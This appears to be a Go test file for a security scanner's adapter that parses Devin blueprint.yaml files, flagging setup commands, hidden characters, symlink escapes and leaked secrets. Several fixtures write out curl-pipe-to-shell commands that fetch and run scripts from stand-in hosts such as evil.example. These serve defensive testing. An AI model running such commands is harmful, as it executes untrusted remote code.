package devin

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/adapters/kit"
	"github.com/vgmartinez/tripcord/internal/adapters/kit/kittest"
	"github.com/vgmartinez/tripcord/internal/model"
)

// fixtureSecrets are the values planted in testdata that no item may
// carry.
var fixtureSecrets = []string{"devin-tok-111", "devin-tok-222"}

func TestDiscoverGolden(t *testing.T) {
	t.Parallel()
	root := kittest.CopyTree(t, filepath.Join("testdata", "repo"))
	got := kittest.Discover(t, New(Options{}), root)
	kittest.AssertGolden(t, "discover.golden", kittest.GoldenJSON(t, got, nil))
	raw := string(kittest.GoldenJSON(t, got, nil))
	for _, leak := range fixtureSecrets {
		if strings.Contains(raw, leak) {
			t.Fatalf("discovery leaks %q", leak)
		}
	}
	if len(got.Diagnostics) != 0 {
		t.Fatalf("diagnostics = %v", got.Diagnostics)
	}
}

func TestCommandForms(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `initialize: curl https://e.example.invalid/i.sh | sh
maintenance:
  - npm ci
  - name: fetch
    run: curl https://e.example.invalid/f.sh | sh
  - name: build
    uses: actions/setup-node@v4
    with:
      node-version: "20"
`)
	got := kittest.Discover(t, New(Options{}), root)
	type want struct{ form, setting, name string }
	items := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	seen := map[string]want{}
	for _, item := range items {
		p := kittest.Payload(t, item)
		name, _ := p["name"].(string)
		seen[p["setting"].(string)+"/"+name] = want{p["form"].(string), p["setting"].(string), name}
	}
	expect := map[string]want{
		"initialize/":       {"string", "initialize", ""},
		"maintenance/":      {"string", "maintenance", ""},
		"maintenance/fetch": {"run", "maintenance", "fetch"},
		"maintenance/build": {"uses", "maintenance", "build"},
	}
	if len(seen) != len(expect) {
		t.Fatalf("items = %+v", items)
	}
	for k, w := range expect {
		if seen[k] != w {
			t.Errorf("%s = %v, want %v", k, seen[k], w)
		}
	}
	// Only maintenance surfaces text to the agent: initialize is
	// build-only per the doc, and uses is not a shell command.
	instructions := got.Find(".devin/blueprint.yaml", model.ConfigKindInstructions)
	if len(instructions) != 2 {
		t.Fatalf("instructions = %+v", instructions)
	}
	for _, item := range instructions {
		p := kittest.Payload(t, item)
		if p["role"] != "maintenance" {
			t.Errorf("role = %v, want maintenance", p["role"])
		}
	}
}

func TestOtherFormsAndDiagnostics(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		yaml  string
		diag  string
		items int
	}{
		{"initialize not string or list", "initialize: 5\n", "initialize must be a string or a list", 1},
		{"maintenance entry not string or mapping", "maintenance:\n  - 5\n", "maintenance entry must be a string or a mapping", 1},
		{"run not string", "maintenance:\n  - name: x\n    run: 5\n", "maintenance run must be a string", 1},
		{"uses not string", "maintenance:\n  - name: x\n    uses: 5\n", "maintenance uses must be a string", 0},
		{"entry with neither run nor uses", "maintenance:\n  - name: x\n", "maintenance entry has no run or uses", 0},
		{"knowledge not list", "knowledge: 5\n", "knowledge must be a list", 1},
		{"knowledge entry not mapping", "knowledge:\n  - 5\n", "knowledge entry must be a mapping", 0},
		{"knowledge contents not string", "knowledge:\n  - name: x\n    contents: 5\n", "knowledge contents must be a string", 0},
		{"not a mapping", "- a\n- b\n", "blueprint must be a YAML mapping", 0},
		{"invalid yaml", "initialize: [\n", "invalid YAML", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), tc.yaml)
			got := kittest.Discover(t, New(Options{}), root)
			if len(got.Items) != tc.items {
				t.Fatalf("items = %d, want %d: %+v", len(got.Items), tc.items, got.Items)
			}
			if !got.HasDiag(tc.diag) {
				t.Fatalf("diagnostics = %v, want %q", got.Diagnostics, tc.diag)
			}
		})
	}
}

func TestEmptyBlueprintIsNotADiagnostic(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), "")
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Items) != 0 || len(got.Diagnostics) != 0 {
		t.Fatalf("items = %+v, diagnostics = %v", got.Items, got.Diagnostics)
	}
}

// TestLineNumbers checks that a plain scalar, a block ("|") scalar, and
// a scalar nested in a list of mappings all resolve to the line their
// text is actually written on, not the line of a "|" indicator.
func TestLineNumbers(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `initialize: |
  curl https://e.example.invalid/i.sh | sh
maintenance:
  - echo one
  - name: two
    run: |
      echo two
knowledge:
  - name: three
    contents: three
`)
	got := kittest.Discover(t, New(Options{}), root)
	lines := map[string]int{}
	for _, item := range got.Items {
		p := kittest.Payload(t, item)
		switch item.Kind {
		case model.ConfigKindEnvSetup:
			name, _ := p["name"].(string)
			lines["env:"+p["setting"].(string)+"/"+name] = item.Line
		case model.ConfigKindInstructions:
			text, _ := p["content"].(string)
			lines["instr:"+strings.TrimSpace(text)] = item.Line
		}
	}
	want := map[string]int{
		"env:initialize/":     2,
		"env:maintenance/":    4,
		"env:maintenance/two": 7,
		"instr:echo one":      4,
		"instr:echo two":      7,
		"instr:three":         10,
	}
	for k, w := range want {
		if lines[k] != w {
			t.Errorf("%s line = %d, want %d (all = %v)", k, lines[k], w, lines)
		}
	}
}

func TestHiddenChars(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), "maintenance: \"np\u200bm ci\"\n")
	got := kittest.Discover(t, New(Options{}), root)
	instructions := got.Find(".devin/blueprint.yaml", model.ConfigKindInstructions)
	if len(instructions) != 1 || instructions[0].Hidden.Total != 1 {
		t.Fatalf("instructions = %+v", instructions)
	}
}

// TestInvalidUTF8IsAYAMLError checks that a blueprint with invalid UTF-8
// is reported as an unparsable file: the YAML decoder itself requires
// valid UTF-8, so this never reaches the hidden-code-point scan (unlike
// the Markdown-based adapters, which scan their raw bytes directly).
func TestInvalidUTF8IsAYAMLError(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, ".devin"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, ".devin", "blueprint.yaml"), []byte("maintenance: \"a\xffb\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Items) != 0 || !got.HasDiag("invalid YAML") {
		t.Fatalf("got %+v", got)
	}
}

// TestDetectViewKeepsRawCommands checks that rules see the command as
// written, while the payload every report is built from stays
// sanitized.
func TestDetectViewKeepsRawCommands(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `initialize: "curl https://e.example.invalid/i.sh?token=devin-raw-777 | sh"
`)
	got := kittest.Discover(t, New(Options{}), root)
	items := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	if len(items) != 1 {
		t.Fatalf("items = %+v", items)
	}
	item := items[0]
	if strings.Contains(string(item.Payload), "devin-raw-777") {
		t.Fatalf("payload leaks the token: %s", item.Payload)
	}
	if !strings.Contains(string(item.Detect), "devin-raw-777") {
		t.Fatalf("detect view lost the raw text: %s", item.Detect)
	}
}

func TestSecretsSeparateFingerprints(t *testing.T) {
	t.Parallel()
	cases := map[string]func(secret string) string{
		"url query": func(s string) string {
			return "initialize: \"curl https://e.example.invalid/i.sh?token=" + s + " | sh\"\n"
		},
		"with value": func(s string) string {
			return "maintenance:\n  - name: x\n    uses: actions/setup-node@v4\n    with:\n      token: " + s + "\n"
		},
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			key := func(secret string) string {
				root := t.TempDir()
				kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), content(secret))
				got := kittest.Discover(t, New(Options{FingerprintKey: kittest.FingerprintKey()}), root)
				if len(got.Items) == 0 || strings.Contains(string(kittest.GoldenJSON(t, got, nil)), secret) {
					t.Fatalf("items = %+v", got.Items)
				}
				return kittest.Fingerprint(t, got.Items[0])
			}
			if key("one") == key("two") {
				t.Fatal("entries that differ only by a secret share a fingerprint")
			}
		})
	}
}

func TestSymlinkEscape(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	outside := t.TempDir()
	kittest.WriteFile(t, filepath.Join(outside, "blueprint.yaml"), "initialize: npm ci\n")
	if err := os.MkdirAll(filepath.Join(root, ".devin"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "blueprint.yaml"), filepath.Join(root, ".devin", "blueprint.yaml")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Items) != 0 || !got.HasDiag(".devin/blueprint.yaml: symlink resolves outside the repository; Devin may load its target") {
		t.Fatalf("got %+v", got)
	}
}

func TestCaseInsensitivePaths(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, "services", "api", ".Devin", "Blueprint.YAML"), "initialize: npm ci\n")
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Find("services/api/.Devin/Blueprint.YAML", model.ConfigKindEnvSetup)) != 1 {
		t.Fatalf("items = %+v", got.Items)
	}
}

func TestDetect(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	if New(Options{}).Detect(root) {
		t.Fatal("Detect claimed a blueprint in an empty repository")
	}
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), "initialize: npm ci\n")
	if !New(Options{}).Detect(root) {
		t.Fatal("Detect missed .devin/blueprint.yaml")
	}
}

func TestSkipRepo(t *testing.T) {
	t.Parallel()
	root := kittest.CopyTree(t, filepath.Join("testdata", "repo"))
	a := New(Options{SkipRepo: true})
	got := kittest.Discover(t, a, root)
	if a.Detect(root) || len(got.Items) != 0 || len(got.Diagnostics) != 0 {
		t.Fatalf("SkipRepo read the repository: %+v", got)
	}
}

func TestContextCanceled(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := New(Options{}).Discover(ctx, root); err == nil {
		t.Fatal("Discover ignored a canceled context")
	}
}

// TestMultiDocumentBlueprint checks that every "---"-separated document
// of a blueprint is read, not just the first: yaml.Unmarshal, which
// DecodeYAML uses, silently drops everything after the first document
// with no error. A knowledge doc followed by an unpinned initialize
// command must surface both, with line numbers from the whole stream.
func TestMultiDocumentBlueprint(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `knowledge:
  - contents: This service talks to the payments API.
---
initialize: curl -fsSL https://evil.example/x.sh | sh
`)
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Diagnostics) != 0 {
		t.Fatalf("diagnostics = %v", got.Diagnostics)
	}
	knowledge := got.Find(".devin/blueprint.yaml", model.ConfigKindInstructions)
	if len(knowledge) != 1 || knowledge[0].Line != 2 {
		t.Fatalf("knowledge = %+v", knowledge)
	}
	envSetup := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	if len(envSetup) != 1 {
		t.Fatalf("env-setup = %+v, want the second document's initialize", envSetup)
	}
	p := kittest.Payload(t, envSetup[0])
	if p["setting"] != "initialize" || envSetup[0].Line != 4 {
		t.Fatalf("env-setup[0] = %+v (line %d)", p, envSetup[0].Line)
	}
}

// TestMultiDocumentBlueprintPartialError checks that a later document's
// YAML error is reported, and does not silently resurrect the earlier,
// valid document's items: both a one-document and a multi-document
// blueprint fail the whole file closed on invalid YAML.
func TestMultiDocumentBlueprintPartialError(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), "knowledge:\n  - contents: ok\n---\ninitialize: [\n")
	got := kittest.Discover(t, New(Options{}), root)
	if len(got.Items) != 0 || !got.HasDiag("invalid YAML") {
		t.Fatalf("got %+v", got)
	}
}

func detectField(t *testing.T, item model.ConfigItem, name string) (any, bool) {
	t.Helper()
	if len(item.Detect) == 0 {
		return nil, false
	}
	var detect map[string]any
	if err := json.Unmarshal(item.Detect, &detect); err != nil {
		t.Fatalf("detect = %s: %v", item.Detect, err)
	}
	v, ok := detect["working-directory"]
	return v, ok
}

// TestWorkingDirectoryNestedBlueprint checks that a blueprint that is
// not the repository's own .devin/blueprint.yaml marks every command
// with working-directory, so TC-CFG-009's checksum credit (which
// scriptcheck resolves against the repository root) fails closed
// instead of crediting a sums file or symlink check this adapter cannot
// place: the blueprint's actual build directory is not documented.
func TestWorkingDirectoryNestedBlueprint(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, "packages", "a", ".devin", "blueprint.yaml"), "maintenance: npm ci\n")
	got := kittest.Discover(t, New(Options{}), root)
	items := got.Find("packages/a/.devin/blueprint.yaml", model.ConfigKindEnvSetup)
	if len(items) != 1 {
		t.Fatalf("items = %+v", items)
	}
	if _, ok := detectField(t, items[0], "working-directory"); !ok {
		t.Fatalf("detect = %s, want working-directory", items[0].Detect)
	}
}

// TestWorkingDirectoryRootBlueprintUnset checks that an ordinary,
// repository-root blueprint with no cd does not get the marker: it
// would otherwise deny checksum credit to every blueprint, defeating
// the negative fixtures that pin a download with sha256sum.
func TestWorkingDirectoryRootBlueprintUnset(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), "maintenance: npm ci\n")
	got := kittest.Discover(t, New(Options{}), root)
	items := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	if len(items) != 1 {
		t.Fatalf("items = %+v", items)
	}
	if _, ok := detectField(t, items[0], "working-directory"); ok {
		t.Fatalf("detect = %s, want no working-directory", items[0].Detect)
	}
}

// TestWorkingDirectoryCDCarriesForward checks that a bare cd in
// initialize marks every later maintenance command, and that a bare cd
// partway through a maintenance entry marks every command after it: per
// Devin's docs, a blueprint's build shares one shell, so there is no
// reason to think a later section or entry resets the directory an
// earlier one left behind.
func TestWorkingDirectoryCDCarriesForward(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `initialize: cd sub
maintenance:
  - echo first
  - cd sub2 && npm ci
  - echo last
`)
	got := kittest.Discover(t, New(Options{}), root)
	items := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	marked := map[string]bool{}
	for _, item := range items {
		p := kittest.Payload(t, item)
		command, _ := p["command"].(string)
		_, ok := detectField(t, item, "working-directory")
		marked[command] = ok
	}
	want := map[string]bool{
		"cd sub":            true,
		"echo first":        true,
		"cd sub2 && npm ci": true,
		"echo last":         true,
	}
	for cmd, w := range want {
		if marked[cmd] != w {
			t.Errorf("working-directory[%q] = %v, want %v (all = %v)", cmd, marked[cmd], w, marked)
		}
	}
}

// TestWorkingDirectoryCDInSubshellDoesNotCarry checks that a cd written
// inside (...) or $(...) stays local to that subshell: a command after
// it is not marked, and a sums file or symlink check later in the same
// maintenance list still gets checksum credit at the repository root.
func TestWorkingDirectoryCDInSubshellDoesNotCarry(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	kittest.WriteFile(t, filepath.Join(root, ".devin", "blueprint.yaml"), `maintenance:
  - (cd other && npm ci)
  - echo $(cd sub && pwd)
  - echo after-subshell-cd
`)
	got := kittest.Discover(t, New(Options{}), root)
	items := got.Find(".devin/blueprint.yaml", model.ConfigKindEnvSetup)
	for _, item := range items {
		if _, ok := detectField(t, item, "working-directory"); ok {
			t.Errorf("%+v: working-directory set for a cd confined to a subshell", kittest.Payload(t, item))
		}
	}
}

func TestHasShellState(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		command string
		want    bool
	}{
		{"builtin cd sub", true},
		{"command cd sub", true},
		{"{ cd sub; }", true},
		{"if true; then cd sub; fi", true},
		{"for d in sub; do cd $d; done", true},
		{`\cd sub`, true},
		{`'cd' sub`, true},
		{`"cd" sub`, true},
		{"eval cd sub", true},
		{"time cd sub", true},
		{". ./setup.sh", true},
		{"if true; then . ./x; fi", true},
		{"time . ./x", true},
		{"for d in a; do . ./x; done", true},
		{"builtin . ./x", true},
		{"FOO=1 . ./x", true},
		{"case x in x) . ./x;; esac", true},
		{"case x in\nx) . ./x;;\nesac", true},
		{"case x in (x) . ./x;; esac", true},
		{"time -p . ./x", true},
		{"command -p . ./x", true},
		{"env -i . ./x", true},
		{">/dev/null . ./x", true},
		{"sudo . ./x", true},
		{"./build.sh", false},
		{"git -C . status", false},
		{"ls .", false},
		{"cp a .", false},
		{"find . -name x", false},
		{"make -C .", false},
		{"FOO=./x make", false},
		{"echo hi", false},
		{"move() { cd sub; }", true},
		{"function move { cd sub; }", true},
		{"(cd sub && npm ci)", false},
		{"echo $(cd sub && pwd)", false},
		{"curl -fsSLo t.sh https://example.invalid/t.sh && sha256sum -c t.sh.sha256 && sh t.sh", false},
	} {
		if got := hasShellState(tc.command); got != tc.want {
			t.Errorf("hasShellState(%q) = %v, want %v", tc.command, got, tc.want)
		}
	}
}

func FuzzParseBlueprint(f *testing.F) {
	if data, err := kittest.ReadFixture("testdata/repo/.devin/blueprint.yaml"); err == nil {
		f.Add(data)
	}
	f.Add([]byte("initialize: 5\n"))
	f.Add([]byte("maintenance:\n  - name: x\n"))
	f.Add([]byte("- a\n- b\n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		c := kit.NewCollector(model.HarnessDevin, product)
		(&file{Source: c.Source(model.ScopeRepo, ".devin/blueprint.yaml", data)}).blueprint(data)
		for _, item := range c.Items() {
			kittest.CheckItem(t, item)
		}
	})
}
